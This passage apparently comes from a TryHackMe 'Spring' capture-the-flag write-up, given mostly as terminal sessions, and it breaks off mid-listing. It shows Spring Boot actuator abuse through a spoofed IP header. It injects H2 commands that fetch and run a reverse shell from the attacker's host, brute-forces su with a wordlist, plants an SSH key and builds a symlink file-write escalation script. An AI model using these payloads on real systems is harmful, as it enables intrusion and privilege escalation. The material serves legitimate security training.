collection.addPattern("/*");\n                securityConstraint.addCollection(collection);\n                context.addConstraint(securityConstraint);\n                context.setUseHttpOnly(true);\n            }\n\n            @Override\n            protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {\n                Context context = tomcat.addContext("/sources", "/opt/spring/sources/");\n                context.setParentClassLoader(getClass().getClassLoader());\n                context.setUseHttpOnly(true);\n\n                Wrapper defaultServlet = context.createWrapper();\n                defaultServlet.setName("default");\n                defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet");\n                defaultServlet.addInitParameter("debug", "0");\n                defaultServlet.addInitParameter("listings", "false");\n                defaultServlet.setLoadOnStartup(1);\n                defaultServlet.setOverridable(true);\n                context.addChild(defaultServlet);\n                context.addServletMappingDecoded("/", "default");\n\n                return super.getTomcatWebServer(tomcat);\n            }\n        };\n        factory.addAdditionalTomcatConnectors(redirectConnector());\n        return factory;\n    }\n\n    @Configuration\n    @EnableWebSecurity\n    static class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n        @Override\n        protected void configure(HttpSecurity http) throws Exception {\n            http\n                    .authorizeRequests()\n                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")\n                    .and().csrf().disable();\n        }\n\n    }\n}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring/git_data$ curl https://10.10.6.25/?name=pentester -k\nHello, pentester!\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring/git_data$ cat src/main/resources/application.properties\nserver.port=443\nserver.ssl.key-store=classpath:dummycert.p12\nserver.ssl.key-store-password=DummyKeystorePassword123.\nserver.ssl.keyStoreType=PKCS12\nmanagement.endpoints.enabled-by-default=true\nmanagement.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart\nmanagement.endpoint.env.keys-to-sanitize=\nserver.forward-headers-strategy=native\nserver.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04\nserver.error.whitelabel.enabled=false\nspring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration\nserver.servlet.register-default-servlet=true\nspring.mvc.ignore-default-model-on-redirect=true\nspring.security.user.name=johnsmith\nspring.security.user.password=PrettyS3cureSpringPassword123.\ndebug=false\nspring.cloud.config.uri=\nspring.cloud.config.allow-override=true\nmanagement.endpoint.heapdump.enabled=false\nspring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ curl https://10.10.6.25/actuator/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v\n*   Trying 10.10.6.25:443...\n* Connected to 10.10.6.25 (10.10.6.25) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\n* TLSv1.2 (IN), TLS handshake, Finished (20):\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\n* ALPN, server did not agree to a protocol\n* Server certificate:\n*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith\n*  start date: Jul  4 15:33:44 2020 GMT\n*  expire date: Apr 18 15:33:44 2294 GMT\n*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith\n*  SSL certificate verify result: self signed certificate (18), continuing anyway.\n> GET /actuator/ HTTP/1.1\n> Host: 10.10.6.25\n> User-Agent: curl/7.72.0\n> Accept: */*\n> x-9ad42dea0356cb04: 172.16.0.21\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200\n< Cache-Control: private\n< Expires: Thu, 01 Jan 1970 00:00:00 GMT\n< X-Content-Type-Options: nosniff\n< X-XSS-Protection: 1; mode=block\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\n< X-Frame-Options: DENY\n< Content-Type: application/vnd.spring-boot.actuator.v3+json\n< Transfer-Encoding: chunked\n< Date: Tue, 20 Oct 2020 10:00:27 GMT\n<\n* Connection #0 to host 10.10.6.25 left intact\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "_links": {\n    "self": { "href": "https://10.10.6.25/actuator", "templated": false },\n    "beans": {\n      "href": "https://10.10.6.25/actuator/beans",\n      "templated": false\n    },\n    "health": {\n      "href": "https://10.10.6.25/actuator/health",\n      "templated": false\n    },\n    "health-path": {\n      "href": "https://10.10.6.25/actuator/health/{*path}",\n      "templated": true\n    },\n    "shutdown": {\n      "href": "https://10.10.6.25/actuator/shutdown",\n      "templated": false\n    },\n    "env-toMatch": {\n      "href": "https://10.10.6.25/actuator/env/{toMatch}",\n      "templated": true\n    },\n    "env": { "href": "https://10.10.6.25/actuator/env", "templated": false },\n    "mappings": {\n      "href": "https://10.10.6.25/actuator/mappings",\n      "templated": false\n    },\n    "restart": {\n      "href": "https://10.10.6.25/actuator/restart",\n      "templated": false\n    }\n  }\n}\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://www.veracode.com/blog/research/exploiting-spring-boot-actuators"},"https://www.veracode.com/blog/research/exploiting-spring-boot-actuators")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\\\"name\\\":\\\"spring.datasource.hikari.connection-test-query\\\",\\\"value\\\":\\\"CREATE ALIAS EXEC AS CONCAT(\\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\',\\'java.util.Scanner(Runtime.getRun\\',\\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\\');CALL EXEC(\\'ping -c 5 10.8.106.222\\');\\\"}' \"https://10.10.6.25/actuator/env\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},"{\n  \"spring.datasource.hikari.connection-test-query\": \"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 10.8.106.222');\"\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' \"https://10.10.6.25/actuator/restart\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{ "message": "Restarting" }\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\\\"name\\\":\\\"spring.datasource.hikari.connection-test-query\\\",\\\"value\\\":\\\"CREATE ALIAS EXEC AS CONCAT(\\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\',\\' java.util.Scanner(Runtime.getRun\\',\\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\\');CALL EXEC(\\'wget http://10.8.106.222/reverse.sh -O /tmp/reverse.sh\\');\\\"}' \"https://10.10.6.25/actuator/env\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},"{\n  \"spring.datasource.hikari.connection-test-query\": \"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://10.8.106.222/reverse.sh -O /tmp/reverse.sh');\"\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' \"https://10.10.6.25/actuator/restart\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{ "message": "Restarting" }\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\\\"name\\\":\\\"spring.datasource.hikari.connection-test-query\\\",\\\"value\\\":\\\"CREATE ALIAS EXEC AS CONCAT(\\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\',\\' java.util.Scanner(Runtime.getRun\\',\\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\\');CALL EXEC(\\'chmod +x /tmp/reverse.sh\\');\\\"}' \"https://10.10.6.25/actuator/env\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},"{\n  \"spring.datasource.hikari.connection-test-query\": \"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/reverse.sh');\"\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' \"https://10.10.6.25/actuator/restart\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{ "message": "Restarting" }\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\\\"name\\\":\\\"spring.datasource.hikari.connection-test-query\\\",\\\"value\\\":\\\"CREATE ALIAS EXEC AS CONCAT(\\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\',\\' java.util.Scanner(Runtime.getRun\\',\\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\\');CALL EXEC(\\'bash /tmp/reverse.sh\\');\\\"}' \"https://10.10.6.25/actuator/env\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},"{\n  \"spring.datasource.hikari.connection-test-query\": \"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/reverse.sh');\"\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' \"https://10.10.6.25/actuator/restart\" -k\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{ "message": "Restarting" }\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Spring$ nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.6.25] 50702\nbash: cannot set terminal process group (980): Inappropriate ioctl for device\nbash: no job control in this shell\nnobody@spring:/$ whoami\nwhoami\nnobody\nnobody@spring:/$ pwd\npwd\n/\nnobody@spring:/$ find / -name "foothold.txt" 2> /dev/null\nfind / -name "foothold.txt" 2> /dev/null\n/opt/foothold.txt\nnobody@spring:/$ cat /opt/foothold.txt\ncat /opt/foothold.txt\nTHM{dont_expose_.git_to_internet}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ cat /usr/share/wordlists/rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt\nkali@kali:~/CTFs/tryhackme/Spring$ wc -l capitalized_words.txt\n89652 capitalized_words.txt\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"nobody@spring:/tmp$ wget 10.8.106.222/capitalized_words.txt\nwget 10.8.106.222/capitalized_words.txt\n--2020-10-20 10:32:18--  http://10.8.106.222/capitalized_words.txt\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 800052 (781K) [text/plain]\nSaving to: \u2018capitalized_words.txt\u2019\n\n     0K .......... .......... .......... .......... ..........  6%  705K 1s\n    50K .......... .......... .......... .......... .......... 12% 1.43M 1s\n   100K .......... .......... .......... .......... .......... 19% 1.45M 1s\n   150K .......... .......... .......... .......... .......... 25% 1.51M 0s\n   200K .......... .......... .......... .......... .......... 31% 3.30M 0s\n   250K .......... .......... .......... .......... .......... 38% 1.45M 0s\n   300K .......... .......... .......... .......... .......... 44% 1.45M 0s\n   350K .......... .......... .......... .......... .......... 51% 1.44M 0s\n   400K .......... .......... .......... .......... .......... 57% 1.44M 0s\n   450K .......... .......... .......... .......... .......... 63% 1.47M 0s\n   500K .......... .......... .......... .......... .......... 70% 1.46M 0s\n   550K .......... .......... .......... .......... .......... 76% 1.43M 0s\n   600K .......... .......... .......... .......... .......... 83% 1.49M 0s\n   650K .......... .......... .......... .......... .......... 89% 1.49M 0s\n   700K .......... .......... .......... .......... .......... 95% 1.46M 0s\n   750K .......... .......... .......... .                    100% 2.99M=0.5s\n\n2020-10-20 10:32:18 (1.44 MB/s) - \u2018capitalized_words.txt\u2019 saved [800052/800052]\n\nnobody@spring:/tmp$ wget 10.8.106.222/su_brute_force.sh\nwget 10.8.106.222/su_brute_force.sh\n--2020-10-20 10:32:48--  http://10.8.106.222/su_brute_force.sh\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1486 (1.5K) [text/x-sh]\nSaving to: \u2018su_brute_force.sh\u2019\n\n     0K .                                                     100% 3.20M=0s\n\n2020-10-20 10:32:48 (3.20 MB/s) - \u2018su_brute_force.sh\u2019 saved [1486/1486]\n\nnobody@spring:/tmp$ ls -la\nls -la\ntotal 872\ndrwxrwxrwt 20 root   root      4096 Oct 20 10:32 .\ndrwxr-xr-x 24 root   root      4096 Jul  3 06:24 ..\n-rw-r--r--  1 nobody nogroup 800052 Oct 20 10:28 capitalized_words.txt\ndrwxrwxrwt  2 root   root      4096 Oct 20 09:56 .font-unix\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 09:56 hsperfdata_nobody\ndrwxrwxrwt  2 root   root      4096 Oct 20 09:56 .ICE-unix\n-rw-r--r--  1 nobody nogroup     52 Oct 20 09:52 reverse.sh\n-rw-r--r--  1 nobody nogroup   1486 Oct 20 10:32 su_brute_force.sh\ndrwx------  3 root   root      4096 Oct 20 09:56 systemd-private-2297f9f63b0546f98d142121a9cb3fbe-systemd-resolved.service-IV1TyL\ndrwx------  3 root   root      4096 Oct 20 09:56 systemd-private-2297f9f63b0546f98d142121a9cb3fbe-systemd-timesyncd.service-VayZgn\ndrwxrwxrwt  2 root   root      4096 Oct 20 09:56 .Test-unix\ndrwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:02 tomcat.1413271874927061952.443\ndrwxr-xr-x  3 nobody nogroup   4096 Oct 20 09:57 tomcat.4121958550386458699.443\ndrwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:23 tomcat.5071741172342460092.443\ndrwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:16 tomcat.6434282224217597898.443\ndrwxr-xr-x  3 nobody nogroup   4096 Oct 20 10:12 tomcat.7769403354826430658.443\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:12 tomcat-docbase.2314163272531024622.443\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:23 tomcat-docbase.3582439175683483452.443\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:02 tomcat-docbase.3624752303650085691.443\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 10:16 tomcat-docbase.4010369964569599950.443\ndrwxr-xr-x  2 nobody nogroup   4096 Oct 20 09:57 tomcat-docbase.4863931693030932923.443\ndrwxrwxrwt  2 root   root      4096 Oct 20 09:56 .X11-unix\ndrwxrwxrwt  2 root   root      4096 Oct 20 09:56 .XIM-unix\nnobody@spring:/tmp$ chmod +x su_brute_force.sh\nchmod +x su_brute_force.sh\nnobody@spring:/tmp$ time bash su_brute_force.sh capitalized_words.txt\ntime bash su_brute_force.sh capitalized_words.txt\nCreds Found! johnsmith:PrettyS3cureAccountPassword123.\nPassword:\nuid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)\nCracking : [##--------------------------------------] 7\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"nobody@spring:/$ python3 -c \"import pty; pty.spawn('/bin/bash')\"\npython3 -c \"import pty; pty.spawn('/bin/bash')\"\nnobody@spring:/$ su - johnsmith\nsu - johnsmith\nPassword: PrettyS3cureAccountPassword123.\n\njohnsmith@spring:~$ ls -la\nls -la\ntotal 44\ndrwxr-xr-x 7 johnsmith johnsmith 4096 Jul 10 19:57 .\ndrwxr-xr-x 3 root      root      4096 Jun 28 19:28 ..\nlrwxrwxrwx 1 johnsmith johnsmith    9 Jul 10 19:14 .bash_history -> /dev/null\n-rw-r--r-- 1 johnsmith johnsmith  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 johnsmith johnsmith 3771 Apr  4  2018 .bashrc\ndrwx------ 2 johnsmith johnsmith 4096 Jul 10 19:43 .cache\ndrwx------ 3 johnsmith johnsmith 4096 Jun 28 19:29 .gnupg\ndrwxrwxr-x 3 johnsmith johnsmith 4096 Jul 10 19:43 .local\n-rw-r--r-- 1 johnsmith johnsmith  807 Apr  4  2018 .profile\ndrwx------ 2 johnsmith johnsmith 4096 Jul 10 19:16 .ssh\ndrwxrwxr-x 2 johnsmith johnsmith 4096 Oct 20 10:35 tomcatlogs\n-r-------- 1 johnsmith johnsmith   34 Jul 10 19:57 user.txt\njohnsmith@spring:~$ cat user.txt\ncat user.txt\nTHM{this_is_still_password_reuse}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'johnsmith@spring:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /home/johnsmith/.ssh/authorized_keys\n<= kali@kali" > /home/johnsmith/.ssh/authorized_keys\njohnsmith@spring:~$\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ ssh -i ~/.ssh/id_rsa johnsmith@10.10.6.25\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue Oct 20 11:11:11 UTC 2020\n\n  System load:  0.0                Processes:           101\n  Usage of /:   11.7% of 58.80GB   Users logged in:     0\n  Memory usage: 40%                IP address for eth0: 10.10.6.25\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n9 packages can be updated.\n0 updates are security updates.\n\n\njohnsmith@spring:~$ cat /etc/systemd/system/spring.service\n[Unit]\nDescription=Spring Boot Application\nAfter=syslog.target\nStartLimitIntervalSec=0\n\n[Service]\nUser=root\nRestart=always\nRestartSec=1\nExecStart=/root/start_tomcat.sh\n\n[Install]\nWantedBy=multi-user.target\njohnsmith@spring:~$ systemctl status spring\n\u25cf spring.service - Spring Boot Application\n   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)\n   Active: active (running) since Tue 2020-10-20 10:56:05 UTC; 18min ago\n Main PID: 841\n    Tasks: 3 (limit: 1106)\n   CGroup: /system.slice/spring.service\n           \u251c\u2500841 /bin/bash /root/start_tomcat.sh\n           \u251c\u2500852 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom\n           \u2514\u2500853 tee /home/johnsmith/tomcatlogs/1603191365.log\n\nWarning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.\n\njohnsmith@spring:~$ cd tomcatlogs/\njohnsmith@spring:~/tomcatlogs$ pwd\n/home/johnsmith/tomcatlogs\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"target=$1\n\n#send a shutdown request to the spring boot server\ncurl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k\n\n#get date as epoch format\nd=$(date '+%s')\n\n#let's assume 30 seconds is enough to restart the service\nfor i in {1..30}\ndo\n #create symlinks to target file for 30 seconds\n let time=$(( d + i ))\n ln -s $target \"$time.log\"\ndone\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'johnsmith@spring:~/tomcatlogs$ nano arbitrary_file_write.sh\njohnsmith@spring:~/tomcatlogs$ bash arbitrary_file_write.sh /tmp/arbitrary_file_write.test\ncurl: (7) Failed to connect to localhost port 443: Connection refused\njohnsmith@spring:~/tomcatlogs$ bash arbitrary_file_write.sh /tmp/arbitrary_file_write.test\n{"message":"Shutting down, bye..."}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"johnsmith@spring:~/tomcatlogs$ ls -la\ntotal 268\ndrwxrwxr-x 2 johnsmith johnsmith   4096 Oct 20 11:21 .\ndrwxr-xr-x 7 johnsmith johnsmith   4096 Jul 10 19:57 ..\n-rw-r--r-- 1 root      root        6928 Jul 10 19:42 1594410148.log\n-rw-r--r-- 1 root      root        6728 Jul 10 19:47 1594410465.log\n-rw-r--r-- 1 root      root        5237 Jul 10 20:38 1594413491.log\n-rw-r--r-- 1 root      root        7194 Jul 12 11:13 1594552377.log\n-rw-r--r-- 1 root      root        6990 Jul 12 17:26 1594574751.log\n-rw-r--r-- 1 root      root        7429 Jul 12 17:36 1594575333.log\n-rw-r--r-- 1 root      root        7182 Jul 12 17:47 1594576008.log\n-rw-r--r-- 1 root      root        6725 Jul 12 20:07 1594584453.log\n-rw-r--r-- 1 root      root      193976 Oct 20 11:21 1603191365.log\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192819.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192820.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192821.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192822.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192823.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192824.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192825.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192826.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192827.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192828.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192829.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192830.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192831.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192832.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192833.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192834.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192835.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192836.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192837.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192838.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192839.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192840.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192841.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192842.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192843.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192844.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192845.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192846.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192847.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:20 1603192848.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192864.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192865.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192866.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192867.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192868.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192869.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192870.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192871.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192872.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192873.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192874.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192875.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192876.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192877.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192878.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192879.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 